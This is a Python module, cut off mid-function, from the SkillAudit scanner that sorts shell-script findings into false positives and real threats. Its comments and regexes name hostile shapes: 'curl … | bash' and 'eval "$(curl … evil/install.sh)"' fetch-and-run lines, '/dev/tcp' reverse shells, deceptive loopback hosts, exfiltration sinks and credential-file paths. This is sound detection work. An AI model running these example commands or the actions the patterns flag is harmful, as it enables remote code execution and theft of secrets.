#!/usr/bin/env python3
"""Shell context classifier for SkillAudit (issue #41 follow-up).

Currently detects ONE precise FP shape: a match inside a HEREDOC body
whose opener is a PRINT command (``cat`` / ``echo`` / ``printf`` / ``tee``).
Heredocs fed to print commands are user-facing help text written to
stdout/stderr/a file, NOT executed shell — so an install hint like
``npm install -g dev-browser`` printed inside ``cat >&2 <<EOF ... EOF``
is documentation, not a supply-chain action.

The classifier returns one of the standard verdict strings the
``_context_classifier_verdict`` dispatcher in ``cpv_skillaudit_native.py``
already understands:

* ``safe_doc`` — DEMOTE execution-class rules (CMD_INJECTION /
  SHELL_EXEC / SUPPLY_CHAIN / TIME_BOMB) to NIT so the agent layer can
  still triage, and KEEP intent-class rules (PROMPT_INJECT / DATA_EXFIL /
  URL_SUSPICIOUS / …) visible per the iron rule (prose CAN carry intent).
* ``""`` (unknown) — fall through to the existing heuristic chain when
  the match isn't inside a print heredoc.

Conservatively narrow on purpose: install hints inside a real ``bash -c``,
inside a function body that's actually executed, or in any non-print
context KEEP firing. The "is it inside a printed heredoc?" question is
answered by a simple opener / closer walk — no full shell parser needed.

Future extensions (shellcheck-style flow analysis, command-substitution
detection, exec-vs-print disambiguation for ``tee``) can layer on top of
this minimal start without changing the dispatcher contract.
"""

from __future__ import annotations

import os
import re
from pathlib import Path
from typing import Final

# Print commands that consume a heredoc and emit it as text (no exec).
# ``tee`` writes to a file, which is also non-exec content. We DO NOT
# include ``bash``/``sh``/``zsh`` (those *execute* the heredoc) nor
# ``eval``/``source``/``.`` (also exec). Anything not on this list keeps
# the match flagged (the conservative side of the gate).
#
# The regex requires the print command at the start of the (possibly
# indented) line, then any chars that aren't ``<`` (so things like
# ``cat >&2``, ``echo -n``, ``printf '%s\\n'`` all match), then ``<<-?``
# with the heredoc delimiter. The optional ``-`` is the indent-stripping
# heredoc variant (``<<-EOF`` lets the closer be tab-indented). The
# delimiter may be quoted (``<<'EOF'`` / ``<<"END"``) — quoting only
# changes whether ``$``-expansion happens inside the body, not whether
# the body is executed, so it's irrelevant to the print-vs-exec gate.
_PRINT_HEREDOC_OPEN_RE: Final[re.Pattern[str]] = re.compile(
    r"^\s*(?:cat|echo|printf|tee)\b[^<]*<<-?(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1"
)

# A command substitution — ``$(...)`` or a backtick span — that the shell
# EXPANDS, running the substituted command. Used to tell an interpolating
# context from a literal one, in the two places that distinction decides
# whether text is inert:
#
#   * #83.5 — an UNQUOTED ``<<EOF`` heredoc body interpolates these, so such a
#     body line is NOT inert and stays visible, unlike plain printed help-text.
#     (A QUOTED ``<<'EOF'`` body interpolates nothing, so this is moot there.)
#   * #180 — a DOUBLE-quoted argument to echo/printf/cat interpolates these
#     too, before the display command is ever invoked. A SINGLE-quoted body
#     is literal. Quote style, not the command, is what decides.
#
# ``$((`` is ARITHMETIC expansion — it evaluates numbers and runs no command —
# so it is excluded. ``$( (cmd) )`` (a subshell) has a space and still matches.
_SHELL_CMD_SUBST_RE: Final[re.Pattern[str]] = re.compile(r"\$\((?!\()|`")


# r01 anthropic FP iter1 (2026-05-27) — CROSS_TOOL_ACCESS shell-script
# field-name discriminator. Mirrors the Python classifier's
# ``_is_api_field_name_match_py`` heuristic for shell scripts:
# ``SYSTEM_PROMPT`` / ``CONTEXT_WINDOW`` / etc. as a bash variable
# name (or env var, or `$VAR` expansion) is LLM-API domain vocabulary
# being USED, not a runtime data-grab on another tool's output.
_API_FIELD_NAMES_SHELL: Final[frozenset[str]] = frozenset(
    {
        "system_prompt",
        "system_message",
        "context_window",
        "full_context",
        "conversation_history",
        "message_history",
        "chat_history",
    }
)
# Real runtime data-grab vocabulary that would override the field-name
# heuristic: a shell script using these would be reading agent tool
# outputs / messages at runtime, which IS suspicious.
_RETRIEVAL_GRAB_RE_SHELL: Final[re.Pattern[str]] = re.compile(
    r"\b(?:get_tools|list_tools|available_tools|call_tool|invoke_tool|use_tool)\b"
    r"|\bprevious_tool_output\b"
    r"|\btool_results?\s*\[",
    re.IGNORECASE,
)


_REGEX_TOOL_CALL_RE_SHELL: Final[re.Pattern[str]] = re.compile(
    r"\b(?:grep|egrep|fgrep|awk|sed|ripgrep|rg|ack|pcregrep)\b"
    r"\s+(?:--?[A-Za-z]+\s+)*"  # optional flags
    r"(?:--?[A-Za-z]+=\S+\s+)*"  # =value flags
    r"['\"](?P<regex>[^'\"]+)['\"]"
)


def _match_inside_regex_arg_shell(line: str, match: str) -> bool:
    """True iff ``match`` (a CMD_INJECTION-style ``|binary`` substring)
    appears INSIDE a quoted regex argument to grep/awk/sed/etc.

    The CMD_INJECTION pattern
    ``(?:;|\\||&&)\\s*\\b(?:curl|wget|nc|bash|sh|python|perl|ruby|php)\\b``
    matches regex-alternation substrings like ``|python`` or ``|php``
    inside grep regex arguments. These are NOT shell pipes — they're
    regex alternation operators inside a quoted string passed to grep.

    Example FPs from r05:
      ``grep -qE "(npx serve|python.*http\\.server)"`` — ``|python`` is
        inside grep's regex parameter
      ``grep -E "(node|python|java)"`` — ``|python`` is in the regex

    Real shell pipe ``cmd | python script.py`` stays visible because
    the binary name appears OUTSIDE any quoted regex on the line.
    """
    if not match:
        return False
    # Collect every grep/awk/sed quoted-regex span on the line.
    regex_spans = [(m.start("regex"), m.end("regex")) for m in _REGEX_TOOL_CALL_RE_SHELL.finditer(line)]
    if not regex_spans:
        return False
    # The catalog gives no column for the match, so locate EVERY occurrence of
    # the ``|binary`` token. Suppress only when ALL occurrences sit inside a
    # quoted regex span — if even one occurrence is OUTSIDE every span, a REAL
    # shell pipe exists on the line and the finding must stay visible. Using
    # ``line.find`` (first occurrence only) silently suppressed a genuine
    # ``foo|python evil.py`` pipe whenever the same token also appeared inside
    # an earlier ``grep -E "(node|python)"`` regex — a security false-negative.
    found_any = False
    pos = line.find(match)
    while pos != -1:
        found_any = True
        if not any(start <= pos <= end for start, end in regex_spans):
            return False  # this occurrence is a real pipe outside any regex
        pos = line.find(match, pos + 1)
    return found_any


# r08 sangrokjung FP iter1 (2026-05-28) — shell execution-class rules
# whose findings inside a full-line `#` comment are provably non-executing.
_SHELL_EXECUTION_CLASS_RULES: Final[frozenset[str]] = frozenset(
    {
        "CMD_INJECTION",
        "SHELL_EXEC",
        "FS_WRITE",
        "PRIVILEGE_ESC",
        "REGEX_DOS",
        "PATH_TRAVERSAL",
        "OBFUSCATION",
        "PERSISTENCE",
        "TIME_BOMB",
        "RESOURCE_ABUSE",
        "REVERSE_SHELL",
        "DESERIALIZATION",
        "INSECURE_CRYPTO",
        "SSTI",
        "SUPPLY_CHAIN",
        "URL_RAW_IP",
        "NET_SUSPICIOUS",
        "CONTAINER_ESCAPE",
        "ENV_INJECTION",
        "TOOL_SHADOW",
        "ENV_RECON",
    }
)


_SHELL_COMMENT_LINE_RE: Final[re.Pattern[str]] = re.compile(r"^\s*#(?!!)")  # `#` but not `#!` shebang

# Security-audit red-team (G5-skillaudit-shell-test-file-blanket, 2026-06-09)
# — the content-threat EXECUTION rules REVERSE_SHELL, CONTAINER_ESCAPE,
# PERSISTENCE, PRIVILEGE_ESC, and SUPPLY_CHAIN were REMOVED from this set,
# mirroring the identical fix already shipped in the TS classifier
# (``_TEST_FILE_BLANKET_SUPPRESS_RULES``). Each of those fires on a SPECIFIC
# malicious payload — ``bash -i >& /dev/tcp/…`` (reverse shell),
# ``docker run --privileged`` / a ``/proc/1/root`` mount (container escape),
# a launchd/crontab install (persistence), ``sudo … NOPASSWD`` (priv-esc), a
# ``curl … | bash`` supply-chain fetch — that is RARE in a legitimate test and
# is EXECUTED at publish time (plugin test files run). Suppressing them by
# filename alone (no content check) was a false negative: a reverse shell
# parked in ``tests/test-foo.sh`` came back ``safe_literal`` (hidden). The
# Python classifier already keeps these visible in ``test_evil.py``; shell now
# matches. Per the project invariant, over-flagging a benign test is
# acceptable; hiding an executed reverse shell is not.
_SHELL_TEST_BLANKET_SUPPRESS_RULES: Final[frozenset[str]] = frozenset(
    {
        "CMD_INJECTION",
        "SHELL_EXEC",
        "TIME_BOMB",
        "RESOURCE_ABUSE",
        "FS_WRITE",
        "PATH_TRAVERSAL",
        "OBFUSCATION",
        "REGEX_DOS",
        "TOOL_SHADOW",
        "SSRF_PATTERN",
        "SSRF_ADVANCED",
        "URL_RAW_IP",
        "NET_SUSPICIOUS",
        "ENV_INJECTION",
        "ENV_RECON",
        "CROSS_TOOL_ACCESS",
        "INSECURE_CRYPTO",
        "URL_SUSPICIOUS",
    }
)


# r10-final FP iter (2026-05-28) — Shell test-file detection.
# Security-audit red-team (G5-skillaudit-shell-test-file-blanket, 2026-06-09):
# split into a path-COMPONENT directory set and basename-anchored prefix/suffix
# rules. The previous implementation matched these as raw SUBSTRINGS anywhere
# in the path (``any(p in fp ...)``), so a REAL install script such as
# ``plugins/latest-release/installer.sh`` matched ``test-`` inside
# ``latest-release`` and had its execution-class findings hard-suppressed.
# Mirrors the TS ``_is_test_file`` / Python ``_is_python_test_file`` predicates
# (extension+location keyed, never substring).
_SHELL_TEST_DIR_COMPONENTS: Final[frozenset[str]] = frozenset(
    {
        "tests",
        "test",
        "__tests__",
        "specs",
        "spec",
        "fixtures",
        "__fixtures__",
        "mocks",
        "__mocks__",
    }
)


# r10-final FP iter (2026-05-28) — shell loopback / RFC1918 private
# IP detection. Mirror of _line_has_loopback_or_private_ip in TS
# classifier.
_LOOPBACK_PRIVATE_IP_RE_SHELL: Final[re.Pattern[str]] = re.compile(
    r"(?:"
    r"127\.\d{1,3}\.\d{1,3}\.\d{1,3}"
    r"|0\.0\.0\.0"
    r"|10\.\d{1,3}\.\d{1,3}\.\d{1,3}"
    r"|192\.168\.\d{1,3}\.\d{1,3}"
    r"|172\.(?:1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}"
    r"|::1\b|\[::1\]"
    r"|fc[0-9a-f]{2}:|fd[0-9a-f]{2}:"
    r"|fe80::"
    r"|localhost\b"
    r")",
    re.IGNORECASE,
)
_CLOUD_METADATA_RE_SHELL: Final[re.Pattern[str]] = re.compile(
    r"169\.254\.169\.254|metadata\.google|metadata\.azure|fd00:ec2::254",
    re.IGNORECASE,
)
# A loopback/private token is DECEPTIVE (NOT a genuine local host) when it is
# immediately followed by ``@`` (URL userinfo — ``http://127.0.0.1@evil.com/``
# connects to evil.com) or ``.<letter>`` (leftmost label of a longer public
# domain — ``127.0.0.1.evil.com`` / ``localhost.attacker.net`` resolve via the
# attacker's DNS). Mirror of the TS ``_DECEPTIVE_LOOPBACK_SUFFIX_RE``.
_DECEPTIVE_LOOPBACK_SUFFIX_RE_SHELL: Final[re.Pattern[str]] = re.compile(r"@|\.[A-Za-z]")
# A PUBLIC egress target on the line — a scheme URL whose host is NOT a
# loopback/private/metadata token, or a bare public IPv4 literal. Its presence
# means the line reaches the public internet, so a loopback token elsewhere on
# the line is decorative (a comment / a separate local check) and MUST NOT
# clear the public payload (destination-scoped, not line-scoped).
_SCHEME_HOST_RE_SHELL: Final[re.Pattern[str]] = re.compile(r"https?://(?P<host>[A-Za-z0-9._\-]+)")
_BARE_IPV4_RE_SHELL: Final[re.Pattern[str]] = re.compile(r"\b(?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b")


def _contains_deceptive_loopback_host_shell(text: str) -> bool:
    """True iff ``text`` contains a loopback/private token that is actually a
    DECEPTIVE host (userinfo before ``@``, or the leftmost label of a longer
    public domain) — a real egress target disguised as loopback."""
    for m in _LOOPBACK_PRIVATE_IP_RE_SHELL.finditer(text):
        if _DECEPTIVE_LOOPBACK_SUFFIX_RE_SHELL.match(text, m.end()):
            return True
    return False


def _line_has_public_egress_target_shell(line: str) -> bool:
    """True iff ``line`` references a PUBLIC network destination — a scheme
    URL (``https://host/…``) whose host is not loopback/private/metadata, or a
    bare public IPv4 literal. Used to refuse the loopback suppression when the
    real payload targets the public internet (the loopback token is then only
    decorative)."""
    for m in _SCHEME_HOST_RE_SHELL.finditer(line):
        host = m.group("host")
        # Cloud-metadata hosts are attacker-reachable → public.
        if _CLOUD_METADATA_RE_SHELL.search(host):
            return True
        if not _LOOPBACK_PRIVATE_IP_RE_SHELL.fullmatch(host) and not _LOOPBACK_PRIVATE_IP_RE_SHELL.match(host):
            # Host is not a loopback/private token → a public destination.
            return True
    for m in _BARE_IPV4_RE_SHELL.finditer(line):
        ip = m.group("ip")
        if _CLOUD_METADATA_RE_SHELL.search(ip):
            return True
        if not _LOOPBACK_PRIVATE_IP_RE_SHELL.match(ip):
            return True
    return False


def _line_has_loopback_or_private_ip_shell(line: str) -> bool:
    """True iff ``line``'s network DESTINATION is a loopback / RFC1918 private
    / link-local host and NOTHING on the line reaches the public internet.

    Hardened (security-audit red-team G5-skillaudit-shell-loopback-token-
    suppress, 2026-06-09): the check is DESTINATION-scoped, not line-scoped. A
    loopback token sitting in a comment / a separate local check on a line that
    ALSO contains a public ``curl … | bash`` no longer clears the public
    payload. Cloud-metadata endpoints and deceptive look-alike hosts
    (``127.0.0.1@evil.com`` / ``localhost.attacker.net``) stay visible."""
    if _CLOUD_METADATA_RE_SHELL.search(line):
        return False
    # A deceptive look-alike host anywhere on the line is a real egress
    # target disguised as loopback → keep visible.
    if _contains_deceptive_loopback_host_shell(line):
        return False
    # A genuine public destination on the line means the loopback token is
    # decorative → do NOT certify the line as loopback-only.
    if _line_has_public_egress_target_shell(line):
        return False
    return bool(_LOOPBACK_PRIVATE_IP_RE_SHELL.search(line))


def _is_shell_test_file(file_path: str) -> bool:
    """True iff ``file_path`` looks like a shell test or fixture script.

    Matching is extension+location keyed (mirrors ``_is_python_test_file`` /
    the TS ``_is_test_file``), NEVER raw substring:
      - A path COMPONENT (a full ``/``-delimited segment) is one of
        ``tests`` / ``test`` / ``__tests__`` / ``specs`` / ``spec`` /
        ``fixtures`` / ``__fixtures__`` / ``mocks`` / ``__mocks__``.
      - The BASENAME starts with ``test-`` / ``test_`` (``test-foo.sh``).
      - The BASENAME contains ``.test.`` / ``.spec.`` / ``_test.`` or ends
        ``-test`` / ``_test`` before its extension.

    A directory like ``latest-release/`` or ``contest/`` no longer matches
    (the old substring check matched ``test-`` / ``test`` inside them and
    hard-suppressed real install scripts). Used to suppress
    TIME_BOMB / RESOURCE_ABUSE / etc. in test scaffolding (sleep, tmux/screen).
    """
    fp = file_path.replace("\\", "/").lower()
    if not fp:
        return False
    parts = fp.split("/")
    if any(component in _SHELL_TEST_DIR_COMPONENTS for component in parts):
        return True
    basename = parts[-1]
    if basename.startswith("test-") or basename.startswith("test_"):
        return True
    if ".test." in basename or ".spec." in basename or "_test." in basename:
        return True
    # Basename ending in ``-test`` / ``_test`` before the extension
    # (``foo_test.sh`` → stem ``foo_test``).
    stem = basename.rsplit(".", 1)[0]
    return stem.endswith("-test") or stem.endswith("_test")


def _is_shell_comment_line(line: str) -> bool:
    """True iff ``line`` is a full-line shell ``#`` comment (not a
    ``#!`` shebang on line 1, not inline ``cmd  # comment``).

    Comments are documentation prose, never executed by the shell.
    Iron rule preserved: prose-vector rules (PROMPT_INJECT / DATA_EXFIL)
    fall through this check and stay visible via the demote pipeline.

    CAUTION: this is LINE-LOCAL. A leading ``#`` only starts a comment when
    the line begins OUTSIDE a quoted string — a double quote opened on an
    earlier line makes the ``#`` ordinary string content, and any ``$(...)``
    or backtick beside it still EXECUTES. Callers that suppress on the
    strength of this predicate must first consult
    ``_shell_quote_state_at_line_start``.
    """
    return bool(_SHELL_COMMENT_LINE_RE.match(line))


# A heredoc body is not lexed like ordinary shell (its quoting rules depend on
# whether the delimiter itself was quoted), so the scanner below refuses to
# guess once one is open. ``<<<`` is a herestring, not a heredoc.
# The leading (?<!<) is load-bearing: without it `search` also tries offset 1
# of a `<<<` herestring, where the remaining `<<'word'` matches and a plain
# herestring would be misread as an unmodelled heredoc.
_HEREDOC_OPEN_ANY_RE: Final[re.Pattern[str]] = re.compile(r"(?<!<)<<-?\s*(?!<)['\"]?[A-Za-z_][A-Za-z0-9_]*")


def _shell_quote_state_at_line_start(lines: list[str], start_idx: int, target_idx: int) -> str:
    """Quote state at the START of ``lines[target_idx]``, lexing forward from
    ``lines[start_idx]``.

    Returns ``"normal"`` (not inside any string), ``"sq"`` (inside a
    single-quoted string), ``"dq"`` (inside a double-quoted string), or
    ``"unknown"`` when a heredoc makes the scan untrustworthy.

    WHY this exists: quoting is the difference between inert text and live
    code, and it spans lines. ``echo "start`` … ``# `whoami` `` … ``end"``
    looks like a comment line in isolation, but the ``#`` is inside an open
    double-quoted string and the backticks run. Single quotes are the only
    form that makes a backtick literal.

    ``"unknown"`` is deliberately distinct from ``"normal"``: a caller adding
    a NEW suppression must require ``"normal"``, so an unmodelled construct
    can never be mistaken for proof of inertness.
    """
    state = "normal"
    for i in range(start_idx, target_idx):
        line = lines[i]
        # Fast path: a line with no quote and no `<<` cannot change the state
        # or open a heredoc, whatever else it contains. These `in` tests run at
        # C speed and skip both the regex and the per-char loop below, which
        # matters because this runs once per comment-line finding — most lines
        # in real code take this branch.
        if state == "normal" and '"' not in line and "'" not in line and "<<" not in line:
            continue
        if state == "normal" and _HEREDOC_OPEN_ANY_RE.search(line):
            return "unknown"
        j = 0
        n = len(line)
        while j < n:
            ch = line[j]
            if state == "normal":
                if ch == "\\":
                    j += 2
                    continue
                if ch == "'":
                    state = "sq"
                elif ch == '"':
                    state = "dq"
                elif ch == "#" and (j == 0 or line[j - 1].isspace()):
                    break  # rest of the line is a comment — nothing to lex
            elif state == "sq":
                # Single quotes take no escapes: only another `'` closes them.
                if ch == "'":
                    state = "normal"
            else:  # dq
                if ch == "\\":
                    j += 2
                    continue
                if ch == '"':
                    state = "normal"
            j += 1
    return state


# Issue #61 — a line that REMOVES a launchd agent is the OPPOSITE of
# establishing persistence. An INSTALL verb on the same line (cp / cat > /
# tee / launchctl load|bootstrap|enable) keeps the finding VISIBLE, so a line
# that tears down an old agent AND installs a new one is not suppressed.
_LAUNCHAGENT_INSTALL_RE: Final[re.Pattern[str]] = re.compile(
    r"(?:\bcp\b|\bcat\b|\btee\b|>\s*['\"]?\S*Library/Launch"
    r"|launchctl\s+(?:load|bootstrap|enable))",
    re.IGNORECASE,
)
_LAUNCHAGENT_REMOVE_RE: Final[re.Pattern[str]] = re.compile(
    r"(?:^|[\s;&|(=])(?:rm|unlink)\b"
    r"|launchctl\s+(?:bootout|unload|remove|disable)\b",
    re.IGNORECASE,
)


def _is_launchagent_removal(line: str) -> bool:
    """True iff ``line`` REMOVES a launchd LaunchAgent / LaunchDaemon (the
    opposite of establishing persistence) — ``rm`` / ``unlink`` of a
    ``Library/LaunchAgents|LaunchDaemons`` plist, or
    ``launchctl bootout|unload|remove|disable``. An INSTALL / load verb on the
    same line keeps the finding visible. (issue #61)"""
    low = line.lower()
    if not ("launchagents" in low or "launchdaemons" in low or "launchctl" in low):
        return False
    if _LAUNCHAGENT_INSTALL_RE.search(line):
        return False  # the line also installs / loads → keep visible
    return bool(_LAUNCHAGENT_REMOVE_RE.search(line))


# Security-audit red-team (G5-skillaudit-shell-test-file-blanket, 2026-06-09)
# — carve-outs that keep two specific shapes VISIBLE even inside a shell test
# file (mirroring the TS classifier's ``_is_hijack_var_injection`` /
# ``_line_has_exec_sink`` test-file carve-outs).
#
# (1) Runtime-hijack ENV var assignment. Assigning to LD_PRELOAD / NODE_OPTIONS
#     / PYTHONSTARTUP / GIT_SSH_COMMAND / BASH_ENV / PATH / … injects attacker
#     code into a legitimate process via a library/interpreter pre-load hook.
#     Shell forms: ``export LD_PRELOAD=...`` and the inline-prefix
#     ``LD_PRELOAD=/tmp/x.so cmd``. A test file IS executed at publish time, so
#     a hijack-var injection there is still a real threat.
_SHELL_HIJACK_VAR_INJECTION_RE: Final[re.Pattern[str]] = re.compile(
    r"(?:^|[\s;&|(])(?:export\s+)?"
    r"(?:LD_PRELOAD|LD_LIBRARY_PATH|DYLD_(?:INSERT_LIBRARIES|LIBRARY_PATH)|"
    r"NODE_OPTIONS|PYTHONSTARTUP|PYTHONPATH|PERL5LIB|RUBYLIB|"
    r"GIT_SSH_COMMAND|GIT_EDITOR|GIT_PROXY_COMMAND|"
    r"CLASSPATH|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS|BASH_ENV|ENV|PATH)"
    r"\s*\+?="
)
# (2) A decode-then-exec OBFUSCATION shape: stdin/value reaches a real shell
#     interpreter (``| bash`` / ``| sh`` / ``| python`` …) or an
#     ``eval`` / ``source`` / ``bash -c`` wrapper. Reuses the in-module
#     interpreter-pipe + exec-wrap recognisers, so a base64/xxd/charcode
#     reconstruction piped into ``| sh`` in a test file stays visible.


def _shell_line_is_hijack_var_injection(line: str) -> bool:
    """True iff ``line`` assigns to a known runtime-hijack env var
    (LD_PRELOAD / NODE_OPTIONS / GIT_SSH_COMMAND / BASH_ENV / PATH / …)."""
    return bool(_SHELL_HIJACK_VAR_INJECTION_RE.search(line))


def _shell_line_has_exec_sink(line: str) -> bool:
    """True iff ``line`` routes data INTO a code-executing sink — a pipe to a
    shell/script interpreter (``| bash`` / ``| sh`` / bare ``| python`` …) or
    an ``eval`` / ``source`` / ``bash -c`` / ``<<<`` wrapper. Used to keep an
    OBFUSCATION decode→exec shape visible inside a test file."""
    return bool(_SHELL_INTERPRETER_PIPE_RE.search(line) or _CMDSUB_EXEC_WRAP_RE.search(line))


# r08 sangrokjung FP iter1 (2026-05-28) — common shell command
# substitutions with literal-only arguments. The catalog CMD_INJECTION
# pattern ``\$\((?:cat|ls|whoami|id|uname)\s+\S`` matches every cmdsub,
# but cmdsubs with all-literal args have no injection surface.
_SHELL_LITERAL_ARG_CMDSUB_RE: Final[re.Pattern[str]] = re.compile(
    r"\$\((?P<cmd>cat|ls|whoami|id|uname|head|tail|less|more|file|stat|wc|"
    r"pwd|date|hostname|echo|basename|dirname|realpath|readlink|"
    r"curl|wget|http|https)"
    r"(?P<args>(?:\s+(?:-{1,2}[A-Za-z][A-Za-z0-9_-]*|\"[^\"$`]+\"|'[^'$`]+'|"
    r"https?://[^\s$`)]+|[A-Za-z0-9_./:@,+-]+))*)"
    r"(?:\s+2>/dev/null|\s+2>&1)?"
    r"\s*\)"
)


# r* FP iter (2026-05-28) — generalised safe-command-substitution
# recognizer. The catalog CMD_INJECTION patterns fire on EVERY
# ``$(cmd ...)`` / ``| binary`` shape, but a command substitution headed
# by a fixed DATA / QUERY command is not command injection even when its
# ARGUMENTS contain ``$VAR`` / ``${VAR}`` — the fixed command does not
# re-evaluate its arguments as shell. The injection surface exists only
# when (a) the command NAME is itself a variable (``$($CMD)``), (b) the
# substitution result is piped to a shell interpreter (``... | bash``),
# or (c) the result is wrapped in ``eval`` / ``bash -c`` / ``source``.
# Those three shapes are kept visible by the guards below.
#
# Examples (SUPPRESS — benign data read/query, $VAR is a parameter):
#   pid=$(cat "$PID_FILE")
#   count=$(cat "$COUNTER_FILE")
#   body="$(cat <<'EOF' ... EOF)"
#   files=$(ls -A "$REPO_DIR/$dir" 2>/dev/null)
#   n=$(ls -d plugins/*/ | wc -l)
#   code="$(curl -sS -o /dev/null -w '%{http_code}' "$url")"
#   ver=$(curl -s https://api.github.com/... | jq -r '.tag_name' | sed 's/^v//')
#   text=$(echo "$RAW" | perl -0777 -pe 's/.../.../')
#
# Examples (KEEP visible — genuine execution surface):
#   eval "$(curl -fsSL https://evil/install.sh)"
#   bash -c "$(cat "$ATTACKER_FILE")"
#   curl -fsSL https://get.example/install.sh | bash
#   $($USER_SUPPLIED_CMD)
_SAFE_CMDSUB_DATA_COMMANDS: Final[frozenset[str]] = frozenset(
    {
        "cat",
        "ls",
        "head",
        "tail",
        "wc",
        "grep",
        "egrep",
        "fgrep",
        "rg",
        "sed",
        "awk",
        "gawk",
        "mawk",
        "jq",
        "yq",
        "cut",
        "tr",
        "sort",
        "uniq",
        "dirname",
        "basename",
        "realpath",
        "readlink",
        "pwd",
        "date",
        "stat",
        "find",
        "od",
        "xxd",
        "printf",
        "echo",
        "uname",
        "hostname",
        "whoami",
        "id",
        "sw_vers",
        "defaults",
        "scutil",
        "sysctl",
        "tput",
        "stty",
        "expr",
        "seq",
        "column",
        "fold",
        "nl",
        "rev",
        "paste",
        "comm",
        "type",
        "command",
        "which",
        "ps",
        "df",
        "du",
        "git",
        "openssl",
        "md5",
        "md5sum",
        "shasum",
        "sha256sum",
        "cksum",
        "test",
        "true",
        "false",
        "env",
        "jobs",
        "tty",
    }
)
# curl / wget / http(ie) head a substitution that FETCHES data; benign
# only when their output is captured / piped to a data processor and NOT
# to a shell interpreter (the latter is the supply-chain exec shape and
# is kept visible by ``_SHELL_INTERPRETER_PIPE_RE``).
_NET_CAPTURE_CMDSUB_COMMANDS: Final[frozenset[str]] = frozenset({"curl", "wget", "http", "https", "fetch", "wget2"})

# First token after ``$(`` (skipping leading whitespace). A leading ``$``
# (i.e. ``$($CMD)`` / ``$(${cmd})``) does NOT match → kept visible.
_CMDSUB_HEAD_RE: Final[re.Pattern[str]] = re.compile(r"\$\(\s*(?P<cmd>[A-Za-z_][A-Za-z0-9_.+-]*)")
# A pipe into a real interpreter that executes stdin AS CODE. The
# negative lookahead exempts ``perl``/``python``/``ruby``/``php`` when an
# inline ``-e`` / ``-pe`` / ``-ne`` SCRIPT flag is present (the program is
# the literal flag value; stdin is data, sed-style).
_SHELL_INTERPRETER_PIPE_RE: Final[re.Pattern[str]] = re.compile(
    r"\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:sh|bash|zsh|dash|ksh|fish|node|deno)\b"
    r"|\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:python[0-9.]*|ruby|perl|php)\b"
    r"(?![^|]*\s-[A-Za-z0-9]*e)"
)
# ``eval`` / ``source`` / ``. `` / ``sh -c`` / ``bash -c`` / ``<<<`` that
# EXECUTE a substituted value. Presence anywhere on the line keeps the
# match visible (conservative — these are the real exec shapes).
_CMDSUB_EXEC_WRAP_RE: Final[re.Pattern[str]] = re.compile(
    r"\beval\b|\bsource\b|^\s*\.\s|\|\s*\.\s"
    r"|\b(?:sh|bash|zsh|dash|ksh)\s+(?:-\S+\s+)*-[A-Za-z]*c\b"
    r"|\b(?:sh|bash|zsh|dash|ksh)\s+<<<"
)
# Pipe into a text processor that NEVER executes its stdin as code.
_PIPE_TEXT_PROCESSOR_RE: Final[re.Pattern[str]] = re.compile(
    r"\|\s*(?:sed|awk|gawk|mawk|jq|yq|grep|egrep|fgrep|rg|cut|tr|sort|uniq|"
    r"head|tail|wc|column|fold|nl|rev|tee|cat|xxd|od|tac|paste|comm|"
    r"base64|tr|fmt|expand|unexpand|pr)\b"
    r"|\|\s*(?:perl|python[0-9.]*|ruby)\b[^|]*?\s-[A-Za-z0-9]*e",
)


# Sensitive system credential / secret paths. A read of one of these
# (even via a "safe" command like ``cat``/``head``) is reconnaissance and
# MUST stay visible — ``cat /etc/passwd`` is the canonical example. The
# safe-data-command suppressors below skip the line when one is present.
_SENSITIVE_READ_PATH_RE: Final[re.Pattern[str]] = re.compile(
    r"/etc/(?:passwd|shadow|sudoers|gshadow|master\.passwd)\b"
    r"|/proc/(?:self|\d+)/(?:environ|cmdline|maps|mem)\b"
    r"|(?:^|[\s\"'=({/])(?:\.ssh/|id_rsa\b|id_ed25519\b|id_ecdsa\b|id_dsa\b)"
    r"|\.aws/credentials\b|\.git-credentials\b|\.netrc\b|\.npmrc\b|\.pypirc\b"
    r"|\.docker/config\.json\b|\.kube/config\b|\.config/gh/\b"
    r"|/root/\.|~/\.ssh\b|secrets?\.(?:ya?ml|json|env|txt)\b",
    re.IGNORECASE,
)


def _reads_sensitive_path(line: str) -> bool:
    """True iff ``line`` references a sensitive system credential / secret
    path. Such a read is reconnaissance and must NOT be suppressed even
    when the command itself (``cat``/``head``/…) is otherwise benign."""
    return bool(_SENSITIVE_READ_PATH_RE.search(line))


# Exfiltration sinks: a data command's output piped INTO a network tool
# (``| curl`` / ``| nc`` …) or redirected to a raw socket (``/dev/tcp/`` /
# ``/dev/udp/``) leaves the machine. ``$(curl …)`` (curl as the CAPTURED
# command) is NOT this shape — only a pipe/redirect INTO a net tool is.
_EXFIL_SINK_RE: Final[re.Pattern[str]] = re.compile(
    r"\|\s*(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|telnet|socat|mail|sendmail|ssh|ftp)\b"
    r"|/dev/(?:tcp|udp)/"
    r"|>\s*/dev/(?:tcp|udp)"
)


def _line_has_exfil_sink(line: str) -> bool:
    """True iff ``line`` pipes/redirects data INTO a network egress sink."""
    return bool(_EXFIL_SINK_RE.search(line))


def _line_leaks_secret_var_to_url(line: str) -> bool:
    """True iff a secret-looking shell variable (``$API_TOKEN`` / ``${KEY}`` /
    …) is interpolated into a URL query-parameter or a ``-d``/``--data`` POST
    body on ``line`` — i.e. a credential is placed in an exfil position.

    Reuses ``_SECRET_VAR_NAME_RE`` + ``_exfil_position_ref`` (the same pair the
    issue-#59 live-sink discriminators use). Security-audit red-team
    G5-skillaudit-curl-cmdsub-exfil (2026-06-09): a ``$(curl
    "https://host/c?leak=$API_TOKEN")`` must NOT be certified a benign
    data-fetch when it carries a secret off the machine."""
    for vm in _VAR_REF_RE.finditer(line):
        name = vm.group("name")
        if _SECRET_VAR_NAME_RE.search(name) and _exfil_position_ref(line, name):
            return True
    return False


def _cmdsub_is_safe_data_command(line: str, match: str) -> bool:
    """True iff a CMD_INJECTION ``$(...)`` match is a command substitution
    headed by a fixed data/query command whose result is neither piped to
    a shell interpreter nor wrapped in ``eval``/``bash -c``/``source``.

    See ``_SAFE_CMDSUB_DATA_COMMANDS`` for the rationale and examples.
    """
    if "$(" not in line:
        return False
    # Reconnaissance read of a sensitive credential path → keep visible.
    if _reads_sensitive_path(line):
        return False
